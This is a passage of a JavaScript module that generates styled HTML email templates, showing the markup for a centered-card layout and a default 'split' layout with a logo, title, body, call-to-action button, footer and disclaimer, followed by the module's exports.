<table role="presentation" width="560" align="center" style="max-width:560px;margin:-40px auto 0 auto;background:${style.cardBg};border-radius:${style.borderRadius};box-shadow:0 4px 24px rgba(0,0,0,0.12);" cellpadding="0" cellspacing="0">
<tr><td style="padding:36px;font-family:${style.fontFamily};">

<p style="font-size:15px;color:${style.textColor};line-height:1.8;margin:0 0 24px 0;">
${encodedBody}
</p>

${infoBoxHtml}

<div style="text-align:center;margin-top:28px;">
<a href="${buttonUrl}" style="background:${finalPrimaryColor};color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:50px;font-size:15px;font-weight:600;display:inline-block;box-shadow:0 4px 12px ${finalPrimaryColor}40;">
${encodedButtonText}
</a>
</div>

</td></tr>
</table>
</td></tr>

<tr><td style="padding:32px 20px;text-align:center;font-family:${style.fontFamily};">
<p style="font-size:11px;color:${style.mutedColor};line-height:1.6;">${encodedFooter}</p>
<p style="font-size:10px;color:${style.mutedColor};margin-top:8px;">${encodedDisclaimer}</p>
</td></tr>

</table>
</body></html>`;

        case 'split':
        default:
            return `${baseHead}
<body style="margin:0;padding:0;background-color:${style.bgColor};">
<table role="presentation" width="100%" style="background-color:${style.bgColor};" cellpadding="0" cellspacing="0">
<tr><td style="padding:40px 20px;">
<table role="presentation" width="600" align="center" style="max-width:600px;margin:auto;background:${style.cardBg};border-radius:${style.borderRadius};overflow:hidden;" cellpadding="0" cellspacing="0">

<tr>
<td width="8" style="background:${finalPrimaryColor};"></td>
<td style="padding:32px;font-family:${style.fontFamily};">

<table width="100%" cellpadding="0" cellspacing="0"><tr>
${logoHtml ? `<td width="50" style="vertical-align:top;">${logoHtml}</td>` : ''}
<td style="${logoUrl ? 'padding-left:16px;' : ''}vertical-align:top;">
<h1 style="margin:0;font-size:22px;font-weight:700;color:${style.primaryColor};line-height:1.3;">
${encodedTitle}
</h1>
${content.subtitle ? `<p style="margin:6px 0 0 0;font-size:14px;color:${style.mutedColor};">${encodedSubtitle}</p>` : ''}
</td>
</tr></table>

<hr style="margin:24px 0;border:none;border-top:1px solid ${style.mutedColor}20;">

<p style="font-size:15px;color:${style.textColor};line-height:1.7;margin:0;">
${encodedBody}
</p>

${infoBoxHtml}

<div style="margin-top:28px;">
<a href="${buttonUrl}" style="background:${finalPrimaryColor};color:#ffffff;text-decoration:none;padding:12px 24px;border-radius:${style.borderRadius};font-size:14px;font-weight:600;display:inline-block;">
${encodedButtonText}
</a>
${secondaryBtnHtml}
</div>

<hr style="margin:28px 0 20px 0;border:none;border-top:1px solid ${style.mutedColor}20;">
<p style="font-size:11px;color:${style.mutedColor};line-height:1.5;">${encodedFooter}</p>
<p style="font-size:10px;color:${style.mutedColor};margin-top:6px;">${encodedDisclaimer}</p>

</td>
</tr>

</table>
</td></tr>
</table>
</body></html>`;
    }
}

export default {
    encodeToEntities,
    generateEmailTemplate,
    getTemplateStyle,
    TEMPLATE_STYLES
};

